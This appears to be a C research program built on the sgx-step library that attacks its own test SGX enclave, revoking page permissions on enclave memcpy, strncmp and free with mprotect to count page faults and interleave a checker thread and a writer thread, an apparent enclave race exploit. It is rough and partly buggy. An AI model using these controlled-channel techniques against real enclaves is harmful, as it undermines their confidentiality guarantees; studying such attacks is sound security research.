/* utility headers */

#include <sys/mman.h>
#include <signal.h>
#include "sgx-step/libsgxstep/apic.h"
#include "sgx-step/libsgxstep/cpu.h"
#include "sgx-step/libsgxstep/pt.h"
#include "sgx-step/libsgxstep/sched.h"
#include "sgx-step/libsgxstep/elf_parser.h"
#include "sgx-step/libsgxstep/enclave.h"
#include "sgx-step/libsgxstep/debug.h"
#include "sgx-step/libsgxstep/config.h"
#include "sgx-step/libsgxstep/idt.h"
#include "sgx-step/libsgxstep/config.h"
#include "sgx-step/libsgxstep/cache.h"
#include <string.h>  // For memcpy
#include "Enclave/encl_u.h"  // For test_dummy

/* SGX untrusted runtime */
#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <pthread.h>
#include <stdio.h>


//These are global variables (see memcmp)
int irq_cnt = 0, do_irq = 0, fault_cnt = 0, trigger_cnt = 0, step_cnt = 0;
uint64_t *pte_encl = NULL, *pte_trigger = NULL, *pmd_encl = NULL;
void *code_adrs, *trigger_adrs;

// pointers to memcmp and strncmp and free
void* mc_pt;
void* sc_pt;
void* free_pt;
void* memcpy_page_start;
void* strncmp_page_start;
void* free_page_start;
// test_dummy pointer
//void *td_pt = NULL;

// THREADING INIT
int turn = 0; // 0 for thread_A, 1 for thread_B
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t cond = PTHREAD_COND_INITIALIZER;

sgx_enclave_id_t create_enclave(void)
{
    sgx_launch_token_t token = {0};
    int updated = 0;
    sgx_enclave_id_t eid = -1;

    info_event("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
                                    &token, &updated, &eid, NULL ) );

    return eid;
}

void ocall_print(const char *str)
{
    info("ocall_print: enclave says: '%s'", str);
}


// !!! pointer a has to be uint64_t and not char*
void ocall_print_address(const char *str, uint64_t a)
{
    info("ocall_print_address: enclave says: '%s' '%p'",str, (void*)a);
}


// Called upon SIGSEGV caused by untrusted page tables. 
void fault_handler(int signo, siginfo_t * si, void  *ctx)
{
    
    void *fault_page = (void *)((uintptr_t)si->si_addr & ~(4096 - 1));
    uint64_t erip = edbgrd_erip() - (uint64_t)get_enclave_base();

    switch (signo) {
        case SIGSEGV:
            info("[Thread %lu] Caught page fault with fault address: %p, Adjusted page start: %p, with erip=%#llx\n", pthread_self(), si->si_addr, fault_page, erip);
            break;

        default:
            info("Caught unknown signal '%d'", signo);
            abort();
    }


    //code to get the address and page of the test_dummy() function, which permissions we will revoke like in the example in the paper
    // Align address to page size  
    // !!! test_dummy is page aligned and alone on his page in this setup (see asm.S) so this is a bit unneccessary 
    //void *test_dummy_page_start = (void *)((size_t)td_pt & ~(4096 - 1));
    //printf("test_dummy() address: %p, page start: %p\n", td_pt, test_dummy_page_start);
    


    fault_cnt++;
    printf("faultcnt%d\n",fault_cnt);
    
    if(fault_cnt == 20){
       
        //change thread to writer thread B
        pthread_mutex_lock(&lock);
        turn = 1; // set turn to thread B
        pthread_cond_signal(&cond); // Wake up thread_B
        while(turn != 0){
            pthread_cond_wait(&cond, &lock);
        }
        pthread_mutex_unlock(&lock); //end turn of thread A
    }

    //Revoke access rights on strncmp after caught page fault on memcpy 
    if(fault_page == memcpy_page_start){
        if (mprotect(memcpy_page_start, 4096, PROT_READ | PROT_EXEC) != 0) {
            perror("mprotect failed");
        }else{
            printf("access rights restored on memcpy\n");
        }
        // revoke execute permission on strncmp()
        if (mprotect(strncmp_page_start, 4096, PROT_NONE) != 0) {
            perror("mprotect failed");
        }else{
            printf("access rights revoked on strncmp\n");
        }
    
    }

    //Revoke access rights on memcpy after caught page fault on strncmp 
    if(fault_page == strncmp_page_start){
        if (mprotect(strncmp_page_start, 4096, PROT_READ | PROT_EXEC) != 0) {
            perror("mprotect failed");
        }else{
            printf("access rights restored on strncmp\n");
        }
        // revoke execute permission on memcpy()
        if (mprotect(memcpy_page_start, 4096, PROT_NONE) != 0) {
            perror("mprotect failed");
        }else{
            printf("access rights revoked on memcpy\n");
        }
    
    }

    if (fault_cnt == 61){
         // Revoke access on free for terminating exploit
        if (mprotect(free_page_start, 4096, PROT_NONE) != 0) {
            perror("mprotect failed");
        }else{
            printf("access rights revoked on free\n");
        }
    }

    if (fault_cnt == 62){
        pthread_cancel(pthread_self);
    }


    

    //Restore access rights on test_dummy and change thread
    
    /*
    if(fault_page == test_dummy_page_start){

        // restore rights on test_dummy
        if (mprotect(test_dummy_page_start, 4096, PROT_READ | PROT_EXEC) != 0) {
            perror("mprotect failed");
        }else{
            printf("access rights restored on test_dummy\n");
        }
        

        
        //revoke rights on free
        if (mprotect(free_page_start, 4096, PROT_NONE) != 0) {
            perror("mprotect failed");
        }else{
            printf("access rights revoked on free\n");
        }


        // CHANGE FROM THREAD B TO THREAD A
        pthread_mutex_lock(&lock);
        turn = 0; // set turn to thread A  
        pthread_cond_signal(&cond); // Wake up thread_A
        while(turn != 1){
            pthread_cond_wait(&cond, &lock);
        }
        pthread_mutex_unlock(&lock); //end turn of thread B
        //pthread_exit(NULL);

        
    }*/





    /*
    
    ucontext_t *uc = (ucontext_t *) ctx;

    switch ( signo )
    {
      case SIGSEGV:
        ASSERT(fault_cnt++ < 10);

        #if DEBUG
            info("Caught page fault (base address=%p)", si->si_addr);
        #endif
    
        if (si->si_addr == trigger_adrs)
        {
            #if DEBUG
                info("Restoring trigger access rights..");
            #endif
            ASSERT(!mprotect(trigger_adrs, 4096, PROT_READ | PROT_WRITE));
            do_irq = 1;

            #if !DO_TIMER_STEP
                sgx_step_do_trap = 1;
            #endif
        }
        else
        {
            //info("Unknown #PF address!");
        }
    
        break;

    #if !DO_TIMER_STEP
      case SIGTRAP:
        #if DEBUG
            //info("Caught single-step trap (RIP=%p)\n", si->si_addr);
        #endif

        // ensure RFLAGS.TF is clear to disable debug single-stepping 
        uc->uc_mcontext.gregs[REG_EFL] &= ~0x100;
        break;
    #endif

      default:
        info("Caught unknown signal '%d'", signo);
        abort();
    }

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.

    */
    
}



/* ================== ATTACKER INIT/SETUP ================= */

void register_signal_handler(int signo)
{
    struct sigaction act, old_act;

    /* Specify #PF handler with signinfo arguments */
    memset(&act, 0, sizeof(sigaction));
    act.sa_sigaction = fault_handler;
    act.sa_flags = SA_RESTART | SA_SIGINFO;

    /* Block all signals while the signal is being handled */
    sigfillset(&act.sa_mask);
    ASSERT(!sigaction( signo, &act, &old_act ));
}

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void)
{
    ASSERT( !claim_cpu(VICTIM_CPU) );
    //ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) ); // => throws error
    print_system_settings();

    register_enclave_info();
    print_enclave_info();
    register_signal_handler( SIGSEGV );
}

// Function for thread A
void* thread_A(void* arg) {

    printf("checker thread running\n");

    // locking for turn, sync logic, thread A sleeps until thread B does a page fault
    pthread_mutex_lock(&lock);
    while (turn != 0) { // Wait until it's thread_A's turn
        pthread_cond_wait(&cond, &lock);
    }
    pthread_mutex_unlock(&lock);


    sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;

    //remove access from memcpy
    void* mc_pt;
    ecall_get_memcpy(eidarg, &mc_pt);

    void *memcpy_page_start = (void *)((size_t)mc_pt & ~(4096 - 1));

    printf("memcpy() address: %p, page start: %p\n", mc_pt, memcpy_page_start);


    if (mprotect(memcpy_page_start, 4096, PROT_NONE) != 0) {
        perror("mprotect failed");
    }else{
        printf("access rights revoked on memcpy\n");
    }

    // Enter enclave 
    printf("threadA entering enclave\n");
    ecall_checker_thread(eidarg); 
    printf("threadA finished");

    
}

// Function for thread B

void* thread_B(void* arg) {

    sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;
    
    // locking for turn, sync logic, thread B sleeps until thread A does amount of page fault
    pthread_mutex_lock(&lock);
    while (turn != 1) { // Wait until it's thread_B's turn
        pthread_cond_wait(&cond, &lock);
    }
    pthread_mutex_unlock(&lock);

    printf("threadB running\n");

    ecall_writer_thread(eidarg);

    // CHANGE FROM THREAD B TO THREAD A
    pthread_mutex_lock(&lock);
    turn = 0; // set turn to thread A  
    pthread_cond_signal(&cond); // Wake up thread_A
    while(turn != 1){
        pthread_cond_wait(&cond, &lock);
    }
    pthread_mutex_unlock(&lock); //end turn of thread B
   

    // this ecall will page fault when test_dummy is reached, free() is done, so then pf handler will change thread to thread A

    // revoke execute permission on test_dummy()

    /*void *test_dummy_page_start = (void *)((size_t)td_pt & ~(4096 - 1));
     if (mprotect(test_dummy_page_start, 4096, PROT_NONE) != 0) {
        perror("mprotect failed");
    }else{
        printf("access rights revoked on test_dummy\n");
    }
    // this ecall will page fault when test_dummy is reached, free() is done, so then pf handler will change thread to thread A
    */
   
    
}




int main( int argc, char **argv )
{

    //Create Enclave
    sgx_enclave_id_t eid = create_enclave();
    
    printf("eid%d\n", eid);

    int rv = 1, secret = 1;

    //TESTING 
    //ecall_test_malloc_free(eid);

    // Dry Run 

    ecall_checker_thread(eid);
    //ecall_writer_thread(eid);
    ecall_checker_thread(eid);

    
    void* encl_base_addr = get_enclave_base();
    info("encl base address: '%p'", encl_base_addr);


    void* offset_memcmp = 0x14fa0;
    void* offset_strncmp = 0x15400;
    void* offset_free = 0x13860; // always the same, base of encl different but no ASLR in encl itself


    mc_pt = encl_base_addr + (uint64_t) offset_memcmp;
    sc_pt = encl_base_addr + (uint64_t) offset_strncmp;   
    free_pt = encl_base_addr + (uint64_t) offset_free; // not just same as free of untrusted

    memcpy_page_start = (void *)((size_t)mc_pt & ~(4096 - 1));
    strncmp_page_start = (void *)((size_t)sc_pt & ~(4096 - 1));
    free_page_start = (void *)((size_t)free_pt & ~(4096 - 1));



    printf("memcpy() address: %p, page start: %p\n", mc_pt, memcpy_page_start);
    printf("strncmp() address: %p, page start: %p\n", sc_pt, strncmp_page_start);
    printf("free() address: %p, page start: %p\n", free_pt, free_page_start);



    
   
    
    /* 1. Setup attack execution environment. */
    attacker_config_runtime();

    
    // Create 2 threads
    pthread_t t1, t2;
    pthread_create(&t1, NULL, thread_A, (void*)&eid);
    pthread_create(&t2, NULL, thread_B, (void*)&eid);

    // pthread_join(t1, NULL);
    pthread_join(t2, NULL);




    info_event("destroying SGX enclave");
    //SGX_ASSERT( sgx_destroy_enclave( eid ) );

    info("all is well; exiting..");
	return 0;
}